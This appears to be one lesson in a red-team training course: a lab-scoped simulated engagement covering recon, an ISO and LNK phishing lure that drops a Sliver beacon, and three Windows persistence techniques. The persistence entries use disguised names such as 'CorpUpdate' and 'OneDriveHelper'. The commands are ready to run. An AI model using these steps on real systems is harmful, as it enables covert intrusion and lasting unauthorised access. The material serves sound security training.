---
title: "Full Kill-Chain Lab Day 1 — Recon, Initial Access, Persistence"
tags: [red-team, kill-chain, lab, recon, initial-access, persistence, phishing,
  beacon, Sliver, ATT&CK, T1566, T1547, T1546]
module: 08-RedTeam-02
day: 506
related_topics:
  - Phishing Campaign Full Lab (Day 505)
  - Full Kill-Chain Lab Day 2 (Day 507)
  - Post-Exploitation Advanced (Day 497)
  - AV and EDR Evasion Concepts (Day 494)
---

# Day 506 — Full Kill-Chain Lab Day 1: Recon → Initial Access → Persistence

> "A real engagement does not start at the keyboard. It starts with
> intelligence. Who is the target? What do they run? Where are the gaps?
> You spend more time on recon than on exploitation — because a well-aimed
> attack leaves less noise than a wide scan. Day 1 is about getting in
> cleanly and staying in quietly. Day 2 is about going deep."
>
> — Ghost

---

## Goals

Execute the first half of a multi-day simulated red team engagement.
Complete: OSINT recon → phishing-based initial access → beacon establishment →
persistence mechanism deployment.
Document every action in the engagement log format.

**Prerequisites:** Day 505 (phishing lab), Day 496 (payload dev),
Day 497 (post-exploitation), Day 493 (C2 lab).
**Time budget:** 6 hours.

---

## Part 1 — Engagement Rules of Engagement (ROE)

Before any action: confirm scope and authorisation.

```
Simulated engagement brief:

Client:          CorpLab Industries (lab environment)
Scope:           All systems in 192.168.56.0/24 and 10.10.10.0/24
Excluded:        192.168.56.1 (hypervisor), any system outside scope
Authorised techniques:
  - Phishing simulation (no real emails sent; simulated click via lab trigger)
  - Any post-exploitation technique on in-scope systems
  - Active directory attacks
  - Social engineering simulation (no real phone calls)
Not authorised:
  - Destructive actions (no ransomware simulation, no data deletion)
  - Exfiltration of real data from lab to internet
  - DoS or service disruption

Emergency contact:  Ghost (engagement lead) — always reachable
Deconfliction:      notify before executing DCSync or domain-level changes
```

---

## Part 2 — Phase 1: Recon

### Passive Recon (No Touch on Target)

```bash
# External attack surface discovery:

# 1. Identify exposed services:
nmap -sS -sV -p 80,443,25,587,993,8080,8443 \
    --open -oA recon/external_services 10.10.10.0/24

# 2. Email infrastructure:
nslookup -type=MX corplab.local
nslookup -type=TXT corplab.local   # SPF records
dig TXT _dmarc.corplab.local

# 3. DNS enumeration:
fierce --domain corplab.local
# Or: dnsx -d corplab.local -a -aaaa -cname -mx -ns -txt

# 4. Certificate transparency (simulated — real target):
# curl https://crt.sh/?q=%.corplab.com&output=json | jq '.[].name_value'

# 5. LinkedIn / OSINT for employee names, roles, technology stack:
# → Document: 5 employee names, 3 email patterns, 2 confirmed technology vendors

# Record findings:
cat > recon/passive_summary.txt << 'EOF'
Date: 2026-04-30
Analyst: Ghost

External IPs: 10.10.10.10 (mail), 10.10.10.20 (web), 10.10.10.30 (VPN)
Email pattern: first.last@corplab.local
Confirmed employees:
  - John Smith, IT Manager (LinkedIn)
  - Sarah Jones, HR Director (company website)
  - Mike Chen, Systems Administrator (job posting)
Technology stack:
  - Exchange 2019 (MX record, OWA banner)
  - Windows Server 2019 DC
  - Cisco AnyConnect VPN
EOF
```

### Active Recon (Light Touch on Perimeter)

```bash
# Port scan external-facing services only:
nmap -sV -p 443,80,25,587 10.10.10.10 -oA recon/mail_server
# Read the Exchange version from OWA banner:
curl -k -I https://10.10.10.10/owa/ | grep -i server

# Web application fingerprinting:
whatweb https://10.10.10.20
# → Note CMS, framework versions, headers

# Record: Exchange CU version → check if ProxyLogon/ProxyShell unpatched
```

---

## Part 3 — Phase 2: Initial Access (Simulated Phishing)

In the lab, the phishing "click" is simulated by directly navigating the victim
VM to the phishing URL. In a real engagement, this phase uses the GoPhish
infrastructure from Day 505.

### Pre-Delivery Checklist

```
Before sending (or simulating the click):
  [ ] Beacon tested on clean Windows VM — does it phone home?
  [ ] Beacon survives static AV scan (Day 494–495)
  [ ] C2 server active and listener running (Day 493)
  [ ] Redirector is proxying correctly (Day 492)
  [ ] Payload file named plausibly (not "beacon.exe")
  [ ] Decoy document opens after payload execution
  [ ] Beacon uses HTTPS/DNS with a valid cert (no certificate warnings)
```

### Simulated Click: Execute Payload on Victim VM

```powershell
# On the lab victim Windows VM (simulating the target user clicking):
# The user "receives" the phishing email and opens the ISO attachment.
# Inside the ISO: Workday_Q4_Update.lnk + Workday_Release_Notes.pdf

# Simulate double-click of the LNK:
# This runs: cmd.exe /c start runner.exe && start Workday_Release_Notes.pdf
# runner.exe = Sliver HTTPS beacon (XOR-encrypted, Day 495)

# Verify: Sliver C2 shows new beacon:
sliver > sessions
# → Session: corp\jsmith@WORKSTATION01  arch:amd64  os:windows  ...

# Tag the session:
sliver > use SESSION_ID
sliver [WORKSTATION01] > info
```

### Initial Beacon Tasks (Situational Awareness)

```bash
# From the Sliver beacon — first five minutes:
[WORKSTATION01] > whoami            # corp\jsmith — standard user
[WORKSTATION01] > getuid            # S-1-5-21-XXXXX...-1105
[WORKSTATION01] > hostname          # WORKSTATION01
[WORKSTATION01] > ps                # running processes
[WORKSTATION01] > netstat           # active connections
[WORKSTATION01] > ifconfig          # IP addresses, interfaces
[WORKSTATION01] > execute -o 'net user /domain %USERNAME%'
                                    # current user domain info
[WORKSTATION01] > execute -o 'nltest /dclist:corplab.local'
                                    # identify domain controllers
[WORKSTATION01] > execute -o 'ipconfig /all'
                                    # subnets, DNS servers

# Log all output to engagement notes
```

---

## Part 4 — Phase 3: Persistence

Before moving laterally, establish persistence. If the beacon is lost (AV
quarantine, system reboot, user logout), persistence brings it back.

### Persistence Option A: Scheduled Task (T1053.005)

```powershell
# Create a scheduled task that runs the beacon hourly:
# Use a name that blends in with Windows system tasks

[WORKSTATION01] > execute -o 'schtasks /create \
    /tn "Microsoft\Windows\WindowsUpdate\CorpUpdate" \
    /tr "C:\ProgramData\Microsoft\Update\svchost32.exe" \
    /sc HOURLY /mo 1 /ru SYSTEM /f'

# Copy beacon to the persistence path:
[WORKSTATION01] > upload runner.exe C:\ProgramData\Microsoft\Update\svchost32.exe

# Verify the task:
[WORKSTATION01] > execute -o 'schtasks /query /tn "Microsoft\Windows\WindowsUpdate\CorpUpdate"'
```

### Persistence Option B: Registry Run Key (T1547.001)

```powershell
# Per-user persistence (survives reboot, runs when jsmith logs in):
[WORKSTATION01] > execute -o 'reg add \
    "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \
    /v "OneDriveHelper" /t REG_SZ \
    /d "C:\Users\jsmith\AppData\Roaming\OneDriveHelper.exe" /f'

[WORKSTATION01] > upload runner.exe C:\Users\jsmith\AppData\Roaming\OneDriveHelper.exe
```

### Persistence Option C: WMI Event Subscription (T1546.003)

```powershell
# Most stealthy — survives reboot, no Run key or scheduled task visible
# From an elevated beacon (requires local admin):

[WORKSTATION01] > execute-assembly /path/to/SharpPersist.exe \
    -t wmi -c "C:\ProgramData\Update\svchost32.exe" \
    -n "WindowsUpdateHelper" -m add

# Verify:
[WORKSTATION01] > execute -o 'Get-WMIObject -Namespace root\subscription \
    -Class __EventFilter | Select Name'
```

### Persistence Validation

```bash
# Simulate a reboot:
# (snapshot the VM, revert, reboot, verify beacon phones home)

# After reboot: Sliver should show a new session within 5 minutes
# If it does not: debug which persistence method failed
# Common failure: wrong path (UAC prevented the file copy)
```

---

## Part 5 — Day 1 Engagement Log

Document every action in this format before closing Day 1:

```
=== ENGAGEMENT LOG — Day 1 ===
Date:       2026-04-30
Operator:   Ghost
Target:     CorpLab Industries lab environment

09:00 — Passive recon initiated
  Tool: nmap, nslookup, dig
  Findings: Exchange 2019 on 10.10.10.10, OWA exposed
  ATT&CK: T1590.002 (Gather Victim Network Information: DNS)

09:45 — Phishing payload prepared
  Payload: Sliver HTTPS beacon (XOR-encrypted, runner.exe)
  Delivery: ISO + LNK lure ("Workday_Q4_Update.iso")
  Pretext: Workday session expiry notification
  ATT&CK: T1566.001 (Phishing: Spearphishing Attachment)

10:15 — Payload executed on WORKSTATION01 (jsmith)
  Method: victim double-clicked LNK on simulated phishing page
  Result: Sliver beacon established
  C2 callback: WORKSTATION01 → redirector.corp-secure.com → teamserver
  ATT&CK: T1204.002 (User Execution: Malicious File)
  Detection signals fired: None observed in Sysmon during lab check

10:22 — Situational awareness completed
  User: corp\jsmith (standard domain user, no local admin)
  Domain: CORPLAB.LOCAL
  DC: DC01.corplab.local (10.10.10.5)
  ATT&CK: T1082 (System Information Discovery), T1016 (Network Discovery)

10:45 — Persistence deployed: Scheduled Task + Registry Run Key
  Task: HKLM\...\WindowsUpdate\CorpUpdate (SYSTEM, hourly)
  Run key: HKCU\...\Run\OneDriveHelper (user-level)
  ATT&CK: T1053.005, T1547.001

Day 1 Status: COMPLETE
  Access: confirmed, stable beacon
  Persistence: two mechanisms deployed
  Next: credential access, AD discovery, lateral movement (Day 2)
```

---

## Key Takeaways

1. Recon time is never wasted. Every hour of OSINT reduces the number of
   noisy probes needed during the live phase. A well-researched phishing lure
   has 3× the click rate of a generic one.
2. The first action on a new beacon is always situational awareness —
   not lateral movement. You need to know who you are before you do anything
   that could attract attention.
3. Deploy at least two persistence mechanisms that use different techniques.
   If the scheduled task is caught, the WMI subscription survives. Belt and
   suspenders.
4. Document in real time, not after. The engagement log is the primary output.
   A perfectly executed attack with no documentation is worthless to the client.
5. Know the detection signals for every action you take. If Sysmon is running
   on the victim, assume the blue team can see your actions. Operate as if
   detection is guaranteed — choose the least noisy option at every step.

---

## Exercises

1. Complete Phase 1 (recon) and record your findings in the passive summary
   template from Part 2. Identify at least 3 attack surface items that could
   serve as initial access vectors.
2. Build and deploy the ISO + LNK payload from Day 505. Verify the beacon
   appears in Sliver. Note the exact Sysmon events generated (compare your
   log to the expected events from Day 495).
3. Deploy all three persistence mechanisms (scheduled task, registry run key,
   WMI subscription). Reboot the victim VM. Verify which mechanisms survive the
   reboot and successfully re-establish the beacon.
4. Fill in the engagement log for your Day 1 actions using the template from
   Part 5. Be specific: include timestamps, ATT&CK technique IDs, and detection
   signal observations.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q506.1, Q506.2 …).

---

## Navigation

← Previous: [Day 505 — Phishing Campaign Full Lab](DAY-0505-Phishing-Campaign-Full-Lab.md)
→ Next: [Day 507 — Full Kill-Chain Lab Day 2](DAY-0507-Full-Kill-Chain-Lab-Day-2.md)
